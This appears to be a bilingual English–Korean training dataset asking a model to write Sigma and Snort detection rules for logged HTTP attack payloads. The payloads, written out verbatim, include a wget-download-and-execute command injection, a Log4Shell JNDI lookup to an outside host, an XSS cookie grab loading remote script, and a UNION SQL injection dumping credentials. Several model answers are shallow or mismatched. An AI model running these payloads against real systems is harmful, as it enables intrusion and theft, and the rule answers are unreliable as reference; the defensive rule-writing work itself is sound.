s,instruction_ko,input,input_ko,gpt40_answer,gpt40_answer_ko
"
Sample Sigma Rule is title: Detect command injection in HTTP request description: This rule detects the presence of a command injection attack in HTTP request logs by looking for specific patterns in the request. logsource: category: webserver product: httpd detection: keywords: - 'cd+/' - 'rm+-rf' - 'wget+http:/' - 'chmod+777' condition: keywords falsepositives: - Legitimate administrative actions using similar commands - False matches due to log entries containing one or more of the keywords in a non-malicious context level: high. As following payload, write it in YAML format in one Sigma Rule.
","샘플 Sigma Rule은 title: Detect command injection in HTTP request description: This rule detects the presence of a command injection attack in HTTP request logs by looking for specific patterns in the request. logsource: category: webserver product: httpd detection: keywords: - 'cd+/' - 'rm+-rf' - 'wget+http:/' - 'chmod+777' condition: keywords falsepositives: - Legitimate administrative actions using similar commands - False matches due to log entries containing one or more of the keywords in a non-malicious context level: high 이다.
다음 payload의 해당하는 1개의 Sigma Rule을 YAML 형식으로 작성합니다.","Payload is GET /themes/mambosimple.php?detection=detected&sitename=</title><script src=http://www.test.go.kr/xss.js>alert(document.cookie)</script> HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Host: 10.0.0.100
User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None)
Connection: Keep-Alive.","Payload는 GET /themes/mambosimple.php?detection=detected&sitename=</title><script src=http://www.test.go.kr/xss.js>alert(document.cookie)</script> HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Host: 10.0.0.100
User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None)
Connection: Keep-Alive 이다.",title: detect cross-site scripting (xss) attack in http request description: this rule detects the presence of a cross-site scripting (xss) attack in http request logs by looking for specific patterns in the request. logsource:   category: webserver   product: httpd detection:   keywords:     - '</title><script'     - 'src=http://'     - 'alert(document.cookie)'   condition: all of them falsepositives:   - legitimate code snippets containing one or more of the keywords in a non-malicious context    - false matches due to log entries containing one or more of the keywords in a non-malicious context level: high,title: detect cross-site scripting (xss) attack in http request description: this rule detects the presence of a cross-site scripting (xss) attack in http request logs by looking for specific patterns in the request. logsource:   category: webserver   product: httpd detection:   keywords:     - '</title><script'     - 'src=http://'     - 'alert(document.cookie)'   condition: all of them falsepositives:   - legitimate code snippets containing one or more of the keywords in a non-malicious context    - false matches due to log entries containing one or more of the keywords in a non-malicious context level: high
"
Sample Sigma Rule is title: Detect command injection in HTTP request description: This rule detects the presence of a command injection attack in HTTP request logs by looking for specific patterns in the request. logsource: category: webserver product: httpd detection: keywords: - 'cd+/' - 'rm+-rf' - 'wget+http:/' - 'chmod+777' condition: keywords falsepositives: - Legitimate administrative actions using similar commands - False matches due to log entries containing one or more of the keywords in a non-malicious context level: high. As following payload, write it in YAML format in one Sigma Rule.
","샘플 Sigma Rule은 title: Detect command injection in HTTP request description: This rule detects the presence of a command injection attack in HTTP request logs by looking for specific patterns in the request. logsource: category: webserver product: httpd detection: keywords: - 'cd+/' - 'rm+-rf' - 'wget+http:/' - 'chmod+777' condition: keywords falsepositives: - Legitimate administrative actions using similar commands - False matches due to log entries containing one or more of the keywords in a non-malicious context level: high 이다.
다음 payload의 해당하는 1개의 Sigma Rule을 YAML 형식으로 작성합니다.","Payload is GET /shell?cd+/tmp;rm+-rf+am7;wget+http:/\/10.10.123.123/uc/am7;chmod+777+am7;./am7+jaws;rm+-rf+arm7 HTTP/1.1
Connection: keep-alive
Cache-Control: max-age=0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9.","Payload는 GET /shell?cd+/tmp;rm+-rf+am7;wget+http:/\/10.10.123.123/uc/am7;chmod+777+am7;./am7+jaws;rm+-rf+arm7 HTTP/1.1
Connection: keep-alive
Cache-Control: max-age=0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9 이다.",```yaml title: detect command injection in http request description: this rule detects the presence of a command injection attack in http request logs by looking for specific patterns in the request. logsource:   category: webserver   product: httpd detection:   keywords:     - 'cd+/'     - 'rm+-rf'     - 'wget+http:/'     - 'chmod+777'   condition: keywords falsepositives:   - legitimate administrative actions using similar commands   - false matches due to log entries containing one or more of the keywords in a non-malicious context level: high ```,```yaml title: detect command injection in http request description: this rule detects the presence of a command injection attack in http request logs by looking for specific patterns in the request. logsource:   category: webserver   product: httpd detection:   keywords:     - 'cd+/'     - 'rm+-rf'     - 'wget+http:/'     - 'chmod+777'   condition: keywords falsepositives:   - legitimate administrative actions using similar commands   - false matches due to log entries containing one or more of the keywords in a non-malicious context level: high ```
"
Sample Sigma Rule is title: Detect command injection in HTTP request description: This rule detects the presence of a command injection attack in HTTP request logs by looking for specific patterns in the request. logsource: category: webserver product: httpd detection: keywords: - 'cd+/' - 'rm+-rf' - 'wget+http:/' - 'chmod+777' condition: keywords falsepositives: - Legitimate administrative actions using similar commands - False matches due to log entries containing one or more of the keywords in a non-malicious context level: high. As following payload, write it in YAML format in one Sigma Rule.
","샘플 Sigma Rule은 title: Detect command injection in HTTP request description: This rule detects the presence of a command injection attack in HTTP request logs by looking for specific patterns in the request. logsource: category: webserver product: httpd detection: keywords: - 'cd+/' - 'rm+-rf' - 'wget+http:/' - 'chmod+777' condition: keywords falsepositives: - Legitimate administrative actions using similar commands - False matches due to log entries containing one or more of the keywords in a non-malicious context level: high 이다.
다음 payload의 해당하는 1개의 Sigma Rule을 YAML 형식으로 작성합니다.","Payload is GET /struts/utils.js HTTP/1.1
Host: 10.10.123.123
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_0_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15
X-Client-Ip: ${jndi:ldap://www.test.go.kr:8080/w3ekt2ozxslheku5ln9vv/${sys:java.vendor}_${sys:java.version}}.","Payload는 GET /struts/utils.js HTTP/1.1
Host: 10.10.123.123
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_0_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15
X-Client-Ip: ${jndi:ldap://www.test.go.kr:8080/w3ekt2ozxslheku5ln9vv/${sys:java.vendor}_${sys:java.version}} 이다.",title: detect jndi injection in http request description: this rule detects the presence of a jndi injection attack in http request logs by looking for specific suspicious patterns in the request headers. logsource:   category: webserver   product: httpd detection:   jndi_injection:     pattern:       - '${jndi:ldap://'     headers:       - 'x-client-ip'     condition: pattern in headers falsepositives:   - legitimate use of jndi references in headers   - false matches due to log entries containing one or more of the patterns in a non-malicious context level: high,title: detect jndi injection in http request description: this rule detects the presence of a jndi injection attack in http request logs by looking for specific suspicious patterns in the request headers. logsource:   category: webserver   product: httpd detection:   jndi_injection:     pattern:       - '${jndi:ldap://'     headers:       - 'x-client-ip'     condition: pattern in headers falsepositives:   - legitimate use of jndi references in headers   - false matches due to log entries containing one or more of the patterns in a non-malicious context level: high
"
Sample Sigma Rule is title: Detect command injection in HTTP request description: This rule detects the presence of a command injection attack in HTTP request logs by looking for specific patterns in the request. logsource: category: webserver product: httpd detection: keywords: - 'cd+/' - 'rm+-rf' - 'wget+http:/' - 'chmod+777' condition: keywords falsepositives: - Legitimate administrative actions using similar commands - False matches due to log entries containing one or more of the keywords in a non-malicious context level: high. As following payload, write it in YAML format in one Sigma Rule.
","샘플 Sigma Rule은 title: Detect command injection in HTTP request description: This rule detects the presence of a command injection attack in HTTP request logs by looking for specific patterns in the request. logsource: category: webserver product: httpd detection: keywords: - 'cd+/' - 'rm+-rf' - 'wget+http:/' - 'chmod+777' condition: keywords falsepositives: - Legitimate administrative actions using similar commands - False matches due to log entries containing one or more of the keywords in a non-malicious context level: high 이다.
다음 payload의 해당하는 1개의 Sigma Rule을 YAML 형식으로 작성합니다.","Payload is GET /phpMyAdmin//iisadminpwd/achg.htr
/scripts/setup.php HTTP/1.1User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/172.16.1.12 Safari/537.36Host: 10.10.123.123 Connection: Keep-AliveCache-Control: no-cache.","Payload는 GET /phpMyAdmin//iisadminpwd/achg.htr
/scripts/setup.php HTTP/1.1User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/172.16.1.12 Safari/537.36Host: 10.10.123.123 Connection: Keep-AliveCache-Control: no-cache 이다.",title: detect sensitive file access in http request description: this rule detects the presence of an attempt to access sensitive files and directories on the server in http request logs by looking for specific patterns in the request. logsource:   category: webserver   product: httpd detection:   keywords:     - '/phpmyadmin//iisadminpwd/'     - 'achg.htr'     - '/scripts/setup.php'   user_agent:     - 'mozilla/5.0 (windows nt 6.1; win64; x64) applewebkit/537.36 (khtml like gecko) chrome/172.16.1.12 safari/537.36host: 10.10.123.123'   condition: all of them falsepositives:   - legitimate access to sensitive files and directories   - false matches due to log entries containing one or more of the keywords in a non-malicious context level: high,title: detect sensitive file access in http request description: this rule detects the presence of an attempt to access sensitive files and directories on the server in http request logs by looking for specific patterns in the request. logsource:   category: webserver   product: httpd detection:   keywords:     - '/phpmyadmin//iisadminpwd/'     - 'achg.htr'     - '/scripts/setup.php'   user_agent:     - 'mozilla/5.0 (windows nt 6.1; win64; x64) applewebkit/537.36 (khtml like gecko) chrome/172.16.1.12 safari/537.36host: 10.10.123.123'   condition: all of them falsepositives:   - legitimate access to sensitive files and directories   - false matches due to log entries containing one or more of the keywords in a non-malicious context level: high
"
Sample Sigma Rule is title: Detect command injection in HTTP request description: This rule detects the presence of a command injection attack in HTTP request logs by looking for specific patterns in the request. logsource: category: webserver product: httpd detection: keywords: - 'cd+/' - 'rm+-rf' - 'wget+http:/' - 'chmod+777' condition: keywords falsepositives: - Legitimate administrative actions using similar commands - False matches due to log entries containing one or more of the keywords in a non-malicious context level: high. As following payload, write it in YAML format in one Sigma Rule.
","샘플 Sigma Rule은 title: Detect command injection in HTTP request description: This rule detects the presence of a command injection attack in HTTP request logs by looking for specific patterns in the request. logsource: category: webserver product: httpd detection: keywords: - 'cd+/' - 'rm+-rf' - 'wget+http:/' - 'chmod+777' condition: keywords falsepositives: - Legitimate administrative actions using similar commands - False matches due to log entries containing one or more of the keywords in a non-malicious context level: high 이다.
다음 payload의 해당하는 1개의 Sigma Rule을 YAML 형식으로 작성합니다.","Payload is GET /robots.txt HTTP/1.1
rw-request-time: 1574036860318
cdn-ip: 10.10.123.123
referer: http://admin.corea.school
x-forwarded-for: 10.10.123.123
connection: close
x-via: 1.1 PSzjhzdx5zr114:1 (Cdn Cache Server V2.0), 1.1 PSjsczBGPhq236:5 (Cdn Cache Server V2.0)
accept-encoding: gzip
user-agent: Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://test.go.kr/bot.html)
accept: */*
x-ws-request-id: 5dd1e57c_PSzjhzdx5rc115_15610-58289
x-cdn-src-port: 33312
cdn-src-ip: 10.10.123.123
host: admin.corea.school.","Payload는 GET /robots.txt HTTP/1.1
rw-request-time: 1574036860318
cdn-ip: 10.10.123.123
referer: http://admin.corea.school
x-forwarded-for: 10.10.123.123
connection: close
x-via: 1.1 PSzjhzdx5zr114:1 (Cdn Cache Server V2.0), 1.1 PSjsczBGPhq236:5 (Cdn Cache Server V2.0)
accept-encoding: gzip
user-agent: Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://test.go.kr/bot.html)
accept: */*
x-ws-request-id: 5dd1e57c_PSzjhzdx5rc115_15610-58289
x-cdn-src-port: 33312
cdn-src-ip: 10.10.123.123
host: admin.corea.school 이다.",```yaml title: detect unauthorized access to admin page description: this rule detects an attempt to access the admin page of a website in http request logs by looking for specific patterns in the request. logsource:   category: webserver   product: httpd detection:   keywords:     - 'get /robots.txt http/1.1'     - 'referer: http://admin.corea.school'     - 'user-agent: mozilla/5.0 (compatible; semrushbot/6~bl; +http://test.go.kr/bot.html)'   condition: keywords falsepositives:   - legitimate crawlers accessing website resources   - false matches due to log entries containing one or more of the keywords in a non-malicious context level: medium ```,```yaml title: detect unauthorized access to admin page description: this rule detects an attempt to access the admin page of a website in http request logs by looking for specific patterns in the request. logsource:   category: webserver   product: httpd detection:   keywords:     - 'get /robots.txt http/1.1'     - 'referer: http://admin.corea.school'     - 'user-agent: mozilla/5.0 (compatible; semrushbot/6~bl; +http://test.go.kr/bot.html)'   condition: keywords falsepositives:   - legitimate crawlers accessing website resources   - false matches due to log entries containing one or more of the keywords in a non-malicious context level: medium ```
"
Sample Sigma Rule is title: Detect command injection in HTTP request description: This rule detects the presence of a command injection attack in HTTP request logs by looking for specific patterns in the request. logsource: category: webserver product: httpd detection: keywords: - 'cd+/' - 'rm+-rf' - 'wget+http:/' - 'chmod+777' condition: keywords falsepositives: - Legitimate administrative actions using similar commands - False matches due to log entries containing one or more of the keywords in a non-malicious context level: high. As following payload, write it in YAML format in one Sigma Rule.
","샘플 Sigma Rule은 title: Detect command injection in HTTP request description: This rule detects the presence of a command injection attack in HTTP request logs by looking for specific patterns in the request. logsource: category: webserver product: httpd detection: keywords: - 'cd+/' - 'rm+-rf' - 'wget+http:/' - 'chmod+777' condition: keywords falsepositives: - Legitimate administrative actions using similar commands - False matches due to log entries containing one or more of the keywords in a non-malicious context level: high 이다.
다음 payload의 해당하는 1개의 Sigma Rule을 YAML 형식으로 작성합니다.","Payload is GET /wp-login.php?redirect_to=http%3A%2F%2Fwww.corea.school%2Fwp-config%2F&reauth=1 HTTP/1.1
Accept: text/html application/xhtml+xml image/jxr */*
Referer: http://10.10.123.123:3100/board/portal/mainSkin01.jsp
Accept-Language: ko-KR  User-Agent: Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko  Accept-Encoding: gzip deflate
Host: owa.corea.school
Connection: Keep-Alive  Cookie: PHPSESSID=l3umb8a20lkiu53tr2s0bm9kb3.","Payload는 GET /wp-login.php?redirect_to=http%3A%2F%2Fwww.corea.school%2Fwp-config%2F&reauth=1 HTTP/1.1
Accept: text/html application/xhtml+xml image/jxr */*
Referer: http://10.10.123.123:3100/board/portal/mainSkin01.jsp
Accept-Language: ko-KR  User-Agent: Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko  Accept-Encoding: gzip deflate
Host: owa.corea.school
Connection: Keep-Alive  Cookie: PHPSESSID=l3umb8a20lkiu53tr2s0bm9kb3 이다.","title: detect unauthorized wordpress admin access description: this rule detects unauthorized attempts to access the wordpress admin page, specifically targeting wordpress vulnerabilities, by looking for specific patterns in the http request. logsource:   category: webserver   product: httpd detection:   keywords:     - 'get /wp-login.php?redirect_to'     - 'wp-config'   referer_key:     - '10.10.123.123'   condition: (keywords) and (referer_key) falsepositives:   - legitimate administrative actions accessing the wordpress admin page   - false matches due to log entries containing one or more of the keywords in a non-malicious context level: high","title: detect unauthorized wordpress admin access description: this rule detects unauthorized attempts to access the wordpress admin page, specifically targeting wordpress vulnerabilities, by looking for specific patterns in the http request. logsource:   category: webserver   product: httpd detection:   keywords:     - 'get /wp-login.php?redirect_to'     - 'wp-config'   referer_key:     - '10.10.123.123'   condition: (keywords) and (referer_key) falsepositives:   - legitimate administrative actions accessing the wordpress admin page   - false matches due to log entries containing one or more of the keywords in a non-malicious context level: high"
"
Sample Snort Rule is alert tcp any any -> any 80 (content:""GET""; nocase; http_method; content:""/admin.php""; nocase; http_uri; msg:""Possible web application attack""; sid:100001; rev:1;)
. In the case of the input payload, write only one Snort Rule that can be detected, starting with alert and ending with rev:1;).
","샘플 Snort Rule은 alert tcp any any -> any 80 (content:""""GET""""; nocase; http_method; content:""""/admin.php""""; nocase; http_uri; msg:""""Possible web application attack""""; sid:100001; rev:1;) 이다.
다음 payload의 경우 alert로 시작하여 rev:1;)로 끝나는 탐지 가능한 Snort Rule을 1개만 작성하십시오.","Payload is GET /jenkins/postnuke/index.php?module=My_eGallery&do=showpic&pid=-1/**/AND/**/1=2/**/UNION/**/ALL/**/SELECT/**/0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,concat(0x3C7230783E,pn_uname,0x3a,pn_pass,0x3C7230783E),0,0,0/**/FROM/**/md_users/**/WHERE/**/pn_uid=$id/* HTTP/1.1
Content-Length: 36
Content-Type: application/x-www-form-urlencoded
Host: www.test.go.kr
Connection: Keep-Alive
User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None).","Payload는 GET /jenkins/postnuke/index.php?module=My_eGallery&do=showpic&pid=-1/**/AND/**/1=2/**/UNION/**/ALL/**/SELECT/**/0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,concat(0x3C7230783E,pn_uname,0x3a,pn_pass,0x3C7230783E),0,0,0/**/FROM/**/md_users/**/WHERE/**/pn_uid=$id/* HTTP/1.1
Content-Length: 36
Content-Type: application/x-www-form-urlencoded
Host: www.test.go.kr
Connection: Keep-Alive
User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) 이다.","alert tcp any any -> any 80 (content:""get""; nocase; http_method; content:""/jenkins/postnuke/index.php""; nocase; http_uri; content:""union""; nocase; content:""select""; nocase; content:""concat""; nocase; content:""from""; nocase; content:""where""; nocase; msg:""possible sql injection attack detected""; sid:100002; rev:1;)","alert tcp any any -> any 80 (content:""get""; nocase; http_method; content:""/jenkins/postnuke/index.php""; nocase; http_uri; content:""union""; nocase; content:""select""; nocase; content:""concat""; nocase; content:""from""; nocase; content:""where""; nocase; msg:""possible sql injection attack detected""; sid:100002; rev:1;)"
"
Sample Snort Rule is alert tcp any any -> any 80 (content:""GET""; nocase; http_method; content:""/admin.php""; nocase; http_uri; msg:""Possible web application attack""; sid:100001; rev:1;)
. In the case of the input payload, write only one Snort Rule that can be detected, starting with alert and ending with rev:1;).
","샘플 Snort Rule은 alert tcp any any -> any 80 (content:""""GET""""; nocase; http_method; content:""""/admin.php""""; nocase; http_uri; msg:""""Possible web application attack""""; sid:100001; rev:1;) 이다.
다음 payload의 경우 alert로 시작하여 rev:1;)로 끝나는 탐지 가능한 Snort Rule을 1개만 작성하십시오.","Payload is GET /themes/mambosimple.php?detection=detected&sitename=</title><script src=http://www.test.go.kr/xss.js>alert(document.cookie)</script> HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Host: 10.0.0.100
User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None)
Connection: Keep-Alive.","Payload는 GET /themes/mambosimple.php?detection=detected&sitename=</title><script src=http://www.test.go.kr/xss.js>alert(document.cookie)</script> HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Host: 10.0.0.100
User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None)
Connection: Keep-Alive 이다.","alert tcp any any -> any 80 (content:""get""; nocase; http_method; content:""/themes/mambosimple.php""; nocase; http_uri; content:""<script""; nocase; http_client_body; content:""</script>""; nocase; http_client_body; msg:""possible xss attack detected""; sid:100002; rev:1;)","alert tcp any any -> any 80 (content:""get""; nocase; http_method; content:""/themes/mambosimple.php""; nocase; http_uri; content:""<script""; nocase; http_client_body; content:""</script>""; nocase; http_client_body; msg:""possible xss attack detected""; sid:100002; rev:1;)"
"
Sample Snort Rule is alert tcp any any -> any 80 (content:""GET""; nocase; http_method; content:""/admin.php""; nocase; http_uri; msg:""Possible web application attack""; sid:100001; rev:1;)
. In the case of the input payload, write only one Snort Rule that can be detected, starting with alert and ending with rev:1;).
","샘플 Snort Rule은 alert tcp any any -> any 80 (content:""""GET""""; nocase; http_method; content:""""/admin.php""""; nocase; http_uri; msg:""""Possible web application attack""""; sid:100001; rev:1;) 이다.
다음 payload의 경우 alert로 시작하여 rev:1;)로 끝나는 탐지 가능한 Snort Rule을 1개만 작성하십시오.","Payload is GET /shell?cd+/tmp;rm+-rf+am7;wget+http:/\/10.10.123.123/uc/am7;chmod+777+am7;./am7+jaws;rm+-rf+arm7 HTTP/1.1
Connection: keep-alive
Cache-Control: max-age=0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9.","Payload는 GET /shell?cd+/tmp;rm+-rf+am7;wget+http:/\/10.10.123.123/uc/am7;chmod+777+am7;./am7+jaws;rm+-rf+arm7 HTTP/1.1
Connection: keep-alive
Cache-Control: max-age=0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9 이다.","alert tcp any any -> any 80 (content:""get""; nocase; http_method; content:""/shell?cd""; nocase; http_uri; content:""wget+http""; nocase; http_uri; content:""chmod+777""; nocase; http_uri; content:""./am7+jaws""; nocase; http_uri; msg:""possible command injection attack detected""; sid:100002; rev:1;)","alert tcp any any -> any 80 (content:""get""; nocase; http_method; content:""/shell?cd""; nocase; http_uri; content:""wget+http""; nocase; http_uri; content:""chmod+777""; nocase; http_uri; content:""./am7+jaws""; nocase; http_uri; msg:""possible command injection attack detected""; sid:100002; rev:1;)"
"
Sample Snort Rule is alert tcp any any -> any 80 (content:""GET""; nocase; http_method; content:""/admin.php""; nocase; http_uri; msg:""Possible web application attack""; sid:100001; rev:1;)
. In the case of the input payload, write only one Snort Rule that can be detected, starting with alert and ending with rev:1;).
","샘플 Snort Rule은 alert tcp any any -> any 80 (content:""""GET""""; nocase; http_method; content:""""/admin.php""""; nocase; http_uri; msg:""""Possible web application attack""""; sid:100001; rev:1;) 이다.
다음 payload의 경우 alert로 시작하여 rev:1;)로 끝나는 탐지 가능한 Snort Rule을 1개만 작성하십시오.","Payload is GET /struts/utils.js HTTP/1.1
Host: 10.10.123.123
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_0_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15
X-Client-Ip: ${jndi:ldap://www.test.go.kr:8080/w3ekt2ozxslheku5ln9vv/${sys:java.vendor}_${sys:java.version}}.","Payload는 GET /struts/utils.js HTTP/1.1
Host: 10.10.123.123
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_0_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15
X-Client-Ip: ${jndi:ldap://www.test.go.kr:8080/w3ekt2ozxslheku5ln9vv/${sys:java.vendor}_${sys:java.version}} 이다.","alert tcp any any -> any 80 (content:""get""; nocase; http_method; content:""/struts/utils.js""; nocase; http_uri; content:""${jndi:ldap://""; nocase; http_header; msg:""possible jndi injection attack""; sid:100002; rev:1;)","alert tcp any any -> any 80 (content:""get""; nocase; http_method; content:""/struts/utils.js""; nocase; http_uri; content:""${jndi:ldap://""; nocase; http_header; msg:""possible jndi injection attack""; sid:100002; rev:1;)"
"
Sample Snort Rule is alert tcp any any -> any 80 (content:""GET""; nocase; http_method; content:""/admin.php""; nocase; http_uri; msg:""Possible web application attack""; sid:100001; rev:1;)
. In the case of the input payload, write only one Snort Rule that can be detected, starting with alert and ending with rev:1;).
","샘플 Snort Rule은 alert tcp any any -> any 80 (content:""""GET""""; nocase; http_method; content:""""/admin.php""""; nocase; http_uri; msg:""""Possible web application attack""""; sid:100001; rev:1;) 이다.
다음 payload의 경우 alert로 시작하여 rev:1;)로 끝나는 탐지 가능한 Snort Rule을 1개만 작성하십시오.","Payload is GET /phpMyAdmin//iisadminpwd/achg.htr
/scripts/setup.php HTTP/1.1User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/172.16.1.12 Safari/537.36Host: 10.10.123.123 Connection: Keep-AliveCache-Control: no-cache.","Payload는 GET /phpMyAdmin//iisadminpwd/achg.htr
/scripts/setup.php HTTP/1.1User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/172.16.1.12 Safari/537.36Host: 10.10.123.123 Connection: Keep-AliveCache-Control: no-cache 이다.","alert tcp any any -> any 80 (content:""get""; nocase; http_method; content:""/phpmyadmin//iisadminpwd/achg.htr/scripts/setup.php""; nocase; http_uri; msg:""possible web application attack""; sid:100002; rev:1;)","alert tcp any any -> any 80 (content:""get""; nocase; http_method; content:""/phpmyadmin//iisadminpwd/achg.htr/scripts/setup.php""; nocase; http_uri; msg:""possible web application attack""; sid:100002; rev:1;)"
"
Sample Snort Rule is alert tcp any any -> any 80 (content:""GET""; nocase; http_method; content:""/admin.php""; nocase; http_uri; msg:""Possible web application attack""; sid:100001; rev:1;)
. In the case of the input payload, write only one Snort Rule that can be detected, starting with alert and ending with rev:1;).
","샘플 Snort Rule은 alert tcp any any -> any 80 (content:""""GET""""; nocase; http_method; content:""""/admin.php""""; nocase; http_uri; msg:""""Possible web application attack""""; sid:100001; rev:1;) 이다.
다음 payload의 경우 alert로 시작하여 rev:1;)로 끝나는 탐지 가능한 Snort Rule을 1개만 작성하십시오.","Payload is GET /robots.txt HTTP/1.1
rw-request-time: 1574036860318
cdn-ip: 10.10.123.123
referer: http://admin.corea.school
x-forwarded-for: 10.10.123.123
connection: close
x-via: 1.1 PSzjhzdx5zr114:1 (Cdn Cache Server V2.0), 1.1 PSjsczBGPhq236:5 (Cdn Cache Server V2.0)
accept-encoding: gzip
user-agent: Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://test.go.kr/bot.html)
accept: */*
x-ws-request-id: 5dd1e57c_PSzjhzdx5rc115_15610-58289
x-cdn-src-port: 33312
cdn-src-ip: 10.10.123.123
host: admin.corea.school.","Payload는 GET /robots.txt HTTP/1.1
rw-request-time: 1574036860318
cdn-ip: 10.10.123.123
referer: http://admin.corea.school
x-forwarded-for: 10.10.123.123
connection: close
x-via: 1.1 PSzjhzdx5zr114:1 (Cdn Cache Server V2.0), 1.1 PSjsczBGPhq236:5 (Cdn Cache Server V2.0)
accept-encoding: gzip
user-agent: Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://test.go.kr/bot.html)
accept: */*
x-ws-request-id: 5dd1e57c_PSzjhzdx5rc115_15610-58289
x-cdn-src-port: 33312
cdn-src-ip: 10.10.123.123
host: admin.corea.school 이다.","alert tcp any any -> any 80 (content:""get""; nocase; http_method; content:""/robots.txt""; nocase; http_uri; content:""admin.corea.school""; nocase; http_header; msg:""possible unauthorized access to admin page""; sid:100002; rev:1;)","alert tcp any any -> any 80 (content:""get""; nocase; http_method; content:""/robots.txt""; nocase; http_uri; content:""admin.corea.school""; nocase; http_header; msg:""possible unauthorized access to admin page""; sid:100002; rev:1;)"
